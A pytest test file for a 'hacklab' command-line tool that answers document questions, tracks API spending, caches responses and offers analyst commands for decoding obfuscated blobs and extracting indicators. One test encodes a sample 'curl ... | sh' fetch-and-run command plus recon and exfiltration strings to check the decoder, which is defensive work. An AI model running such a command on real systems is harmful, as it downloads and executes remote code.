import base64
import gzip
import io
import json
import stat
import sys
import threading
from http.server import ThreadingHTTPServer
from pathlib import Path

from hacklab.cache import ResponseCache
from hacklab.cli import main, open_tracker
from hacklab.forensics.decode import xor
from hacklab.mockserver import Handler
from hacklab.tracking import Tracker

REPO = Path(__file__).parents[1]


def invoke(monkeypatch, args):
    monkeypatch.setattr(sys, "argv", ["hacklab", *args])
    return main()


def test_solve_and_submit_local_contract(tmp_path, monkeypatch, capsys):
    source = tmp_path / "facts.txt"
    source.write_text("The owner is Mira.\n")
    task = {"id": "demo", "question": "Who owns it?", "documents": [source.name]}
    task_path = tmp_path / "task.json"
    task_path.write_text(json.dumps(task))
    db = tmp_path / "private" / "tracking.sqlite"
    assert (
        invoke(
            monkeypatch,
            ["--db", str(db), "solve", "--task", str(task_path), "--root", str(tmp_path)],
        )
        == 0
    )
    output = json.loads(capsys.readouterr().out)
    assert output["status"] == "ok"
    assert output["citations"][0]["quote"] == "The owner is Mira."
    tasks_path = tmp_path / "tasks.jsonl"
    tasks_path.write_text(json.dumps(task) + "\n")
    answers_path = tmp_path / "answers.jsonl"
    args = [
        "--db",
        str(db),
        "submit",
        "--input",
        str(tasks_path),
        "--output",
        str(answers_path),
        "--root",
        str(tmp_path),
    ]
    assert invoke(monkeypatch, args) == 0
    assert json.loads(answers_path.read_text())["status"] == "ok"
    before = answers_path.read_bytes()
    assert invoke(monkeypatch, args) == 2
    assert answers_path.read_bytes() == before


def test_invalid_task_does_not_log_reference_body(tmp_path, monkeypatch, capsys):
    task = tmp_path / "bad.json"
    task.write_text(
        json.dumps({"id": "demo", "question": "private-body", "expected": "reference-secret"})
    )
    assert (
        invoke(
            monkeypatch,
            [
                "--db",
                str(tmp_path / "private" / "db.sqlite"),
                "solve",
                "--task",
                str(task),
                "--root",
                str(tmp_path),
            ],
        )
        == 2
    )
    captured = capsys.readouterr()
    assert "reference-secret" not in captured.out + captured.err
    assert "private-body" not in captured.out + captured.err


def test_probe_makes_one_tracked_request_per_model(tmp_path, monkeypatch, capsys):
    import httpx

    from hacklab import providers

    monkeypatch.setenv("SMALL_MODEL_API_KEY", "synthetic-key")
    monkeypatch.setenv("TYPESAFE_API_KEY", "synthetic-key")
    seen = []

    def handler(request):
        seen.append(str(request.url))
        if request.url.path.endswith("/chat/completions"):
            payload = {
                "model": "event-model-0001",
                "choices": [
                    {"message": {"content": '```json\n{"ok": true}\n```'}, "finish_reason": "stop"}
                ],
                "usage": {"prompt_tokens": 12, "completion_tokens": 4},
            }
        else:
            payload = {
                "model": "jev-1.14.0",
                "answers": {"amount": {"type": "noul", "noul": 0.97}},
                "usage": {"input_tokens": 30, "output_tokens": 1},
            }
        return httpx.Response(200, json=payload)

    def make(config, budget, tracker, run_id):
        client = httpx.Client(transport=httpx.MockTransport(handler))
        return (
            providers.SmallModelProvider(
                config.model, config.limits, budget, tracker, run_id, client=client
            ),
            providers.JevProvider(
                config.jev, config.limits, budget, tracker, run_id, client=client
            ),
        )

    monkeypatch.setattr(providers, "make_providers", make)
    config = tmp_path / "live.toml"
    config.write_text(
        '[model]\nprovider = "openai"\nbase_url = "http://localhost/v1"\nmodel = "event-model"\n'
        "[jev]\nenabled = true\n"
    )
    db = tmp_path / "private" / "tracking.sqlite"
    assert invoke(monkeypatch, ["--db", str(db), "probe", "--config", str(config)]) == 0
    report = json.loads(capsys.readouterr().out)
    assert report["ok"] and report["small_model"]["reply"] == {"ok": True}
    assert report["jev"]["reply"] == {"amount": 0.97}
    assert [call["model"] for call in report["calls"]] == ["event-model-0001", "jev-1.14.0"]
    assert [call["input_tokens"] for call in report["calls"]] == [12, 30]
    assert len(seen) == 2
    # Without a live endpoint the probe reports the gap instead of calling anything.
    assert invoke(monkeypatch, ["--db", str(db), "probe"]) == 1
    assert json.loads(capsys.readouterr().out)["setup"]["ok"] is False


def run(monkeypatch, capsys, args):
    code = invoke(monkeypatch, args)
    return code, capsys.readouterr()


def test_practice_benchmark_and_failures_through_the_cli(tmp_path, monkeypatch, capsys):
    monkeypatch.chdir(REPO)
    out = tmp_path / "scenario"
    code, captured = run(
        monkeypatch,
        capsys,
        ["practice", "--seed", "5", "--out", str(out), "--agents", "20", "--events", "300"],
    )
    facts = json.loads(captured.out)
    assert code == 0 and facts["tasks"] == 9 and (out / "docs" / "board.jsonl").is_file()
    db, report = str(tmp_path / "state" / "t.sqlite"), tmp_path / "report.json"
    common = ["--dataset", str(out / "cases.jsonl"), "--root", str(out / "docs")]
    code, captured = run(
        monkeypatch,
        capsys,
        [
            "--db",
            db,
            "benchmark",
            "--config",
            "configs/practice.toml",
            *common,
            "--out",
            str(report),
        ],
    )
    summary = json.loads(captured.out)
    assert code == 0 and summary["accuracy"] == 1.0 and summary["calls"] == 0
    assert "records" not in summary and stat.S_IMODE(report.stat().st_mode) == 0o600
    code, captured = run(monkeypatch, capsys, ["failures", str(report)])
    assert code == 0 and json.loads(captured.out)["failed"] == 0
    assert run(monkeypatch, capsys, ["practice", "--seed", "5", "--out", str(out)])[0] == 2


def test_decode_and_iocs_commands_for_the_analyst(tmp_path, monkeypatch, capsys):
    command = "curl -s http://198.51.100.7/s | sh"
    blob = base64.b64encode(xor(gzip.compress(command.encode(), mtime=0), b"Kq7")).decode()
    path = tmp_path / "blob.txt"
    path.write_text(blob + "\n")
    code, captured = run(monkeypatch, capsys, ["decode", str(path), "--key", "Kq7"])
    assert code == 0 and json.loads(captured.out) == {
        "layers": ["base64", "xor", "gzip"],
        "text": command,
        "binary_bytes": None,
    }
    monkeypatch.setattr(
        sys, "stdin", io.StringIO(base64.b64encode(b"id; uname -a; whoami").decode())
    )
    code, captured = run(monkeypatch, capsys, ["decode", "-"])
    assert json.loads(captured.out)["text"] == "id; uname -a; whoami"
    path.write_text("exfil to 203.0.113.9 with AKIAIOSFODNN7EXAMPLE\n")
    code, captured = run(monkeypatch, capsys, ["iocs", str(path)])
    assert json.loads(captured.out) == {
        "aws_access_key": ["AKIAIOSFODNN7EXAMPLE"],
        "ipv4": ["203.0.113.9"],
    }


def test_budget_and_cache_commands(tmp_path, monkeypatch, capsys):
    config = tmp_path / "dev.toml"
    config.write_text(
        '[model]\nprovider = "openai"\n[budget]\nmax_calls = 10\nmax_tokens = 1000\n'
        f'[cache]\nmode = "readwrite"\npath = "{tmp_path}/c/cache.sqlite"\n'
    )
    db = tmp_path / "state" / "t.sqlite"
    tracker = Tracker(db)
    run_id = tracker.start_run("t", {}, mode="openai")
    tracker.record_call(run_id, "openai", "m", 100, 20, 5.0, "ok")
    tracker.record_call(run_id, "openai", "m", 100, 20, 0.0, "cache_hit", cache_hit=True)
    code, captured = run(monkeypatch, capsys, ["--db", str(db), "budget", "--config", str(config)])
    report = json.loads(captured.out)
    assert report["spent"]["calls"] == 1 and report["spent"]["tokens"] == 120
    assert report["remaining"] == {"calls": 9, "tokens": 880, "usd": None}
    ResponseCache(tmp_path / "c" / "cache.sqlite", "readwrite").put("k", "openai", {"a": 1})
    code, captured = run(monkeypatch, capsys, ["cache", "--config", str(config), "stats"])
    assert json.loads(captured.out)["entries"] == 1
    code, captured = run(monkeypatch, capsys, ["cache", "--config", str(config), "clear"])
    assert json.loads(captured.out) == {"removed": 1}
    monkeypatch.setenv("HACKLAB_CACHE_MODE", "replay")
    code, captured = run(monkeypatch, capsys, ["doctor"])
    assert json.loads(captured.out)["cache_mode"] == "replay"


def test_submit_keeps_input_order_across_workers_and_honours_the_deadline(
    tmp_path, monkeypatch, capsys
):
    for index in range(6):
        (tmp_path / f"n{index}.txt").write_text(f"value {index}\n")
    tasks = tmp_path / "tasks.jsonl"
    tasks.write_text(
        "".join(
            json.dumps(
                {"id": f"t{index}", "question": "Return it.", "documents": [f"n{index}.txt"]}
            )
            + "\n"
            for index in range(6)
        )
    )
    base = ["--db", str(tmp_path / "s" / "t.sqlite"), "submit", "--input", str(tasks)]
    out = tmp_path / "answers.jsonl"
    code, _ = run(
        monkeypatch,
        capsys,
        [*base, "--output", str(out), "--root", str(tmp_path), "--workers", "4"],
    )
    records = [json.loads(line) for line in out.read_text().splitlines()]
    assert code == 0 and [record["id"] for record in records] == [f"t{i}" for i in range(6)]
    assert [record["answer"] for record in records] == [f"value {i}" for i in range(6)]
    late = tmp_path / "late.jsonl"
    code, _ = run(
        monkeypatch,
        capsys,
        [*base, "--output", str(late), "--root", str(tmp_path), "--deadline-seconds", "0"],
    )
    records = [json.loads(line) for line in late.read_text().splitlines()]
    # Past the deadline every task still gets a valid line instead of none.
    assert code == 0 and len(records) == 6
    assert {record["status"] for record in records} == {"abstain"}
    assert records[0]["reason"] == "run_deadline_reached" and records[0]["run_id"] is None
    assert (
        run(monkeypatch, capsys, [*base, "--output", str(tmp_path / "x"), "--workers", "0"])[0] == 2
    )


def test_an_unwritable_tracking_path_falls_back_instead_of_failing_the_run(
    tmp_path, monkeypatch, capsys
):
    blocker = tmp_path / "file"
    blocker.write_text("not a directory")
    tracker = open_tracker(blocker / "state" / "t.sqlite")
    assert tracker.path.name == "tracking.sqlite" and blocker not in tracker.path.parents
    assert "tracking database unavailable" in capsys.readouterr().err
    (tmp_path / "n.txt").write_text("value\n")
    task = tmp_path / "task.json"
    task.write_text(json.dumps({"id": "t", "question": "Return it.", "documents": ["n.txt"]}))
    code, captured = run(
        monkeypatch,
        capsys,
        ["--db", str(blocker / "x.sqlite"), "solve", "--task", str(task), "--root", str(tmp_path)],
    )
    assert code == 0 and json.loads(captured.out)["answer"] == "value"


def test_stand_in_endpoint_serves_the_whole_request_path_over_http(tmp_path, monkeypatch, capsys):
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        monkeypatch.setenv("SMALL_MODEL_BASE_URL", f"http://127.0.0.1:{server.server_port}/v1")
        monkeypatch.setenv("SMALL_MODEL_NAME", "mock-small")
        monkeypatch.setenv("SMALL_MODEL_API_KEY", "synthetic")
        monkeypatch.setenv("TYPESAFE_API_KEY", "synthetic")
        config = tmp_path / "live.toml"
        config.write_text(
            '[model]\nprovider = "openai"\n[jev]\nenabled = true\n'
            f'base_url = "http://127.0.0.1:{server.server_port}/v1/systemone"\n'
        )
        db = str(tmp_path / "s" / "t.sqlite")
        code, captured = run(monkeypatch, capsys, ["--db", db, "probe", "--config", str(config)])
        report = json.loads(captured.out)
        assert code == 0 and report["small_model"]["reply"]["action"] == "final"
        assert report["jev"]["reply"] == {"amount": 1.0}
        (tmp_path / "n.txt").write_text("value\n")
        task = tmp_path / "task.json"
        task.write_text(json.dumps({"id": "t", "question": "What?", "documents": ["n.txt"]}))
        code, captured = run(
            monkeypatch,
            capsys,
            [
                "--db",
                db,
                "solve",
                "--config",
                str(config),
                "--task",
                str(task),
                "--root",
                str(tmp_path),
            ],
        )
        answer = json.loads(captured.out)
        assert code == 0 and answer["status"] == "abstain"
        assert answer["reason"] == "Stand-in endpoint: no model was consulted."
        import httpx

        assert httpx.get(f"http://127.0.0.1:{server.server_port}/health").json() == {"status": "ok"}
        assert (
            httpx.post(f"http://127.0.0.1:{server.server_port}/v1/other", json={}).status_code
            == 404
        )
        assert (
            httpx.post(
                f"http://127.0.0.1:{server.server_port}/v1/chat/completions", content=b"{"
            ).status_code
            == 400
        )
    finally:
        server.shutdown()
        server.server_close()
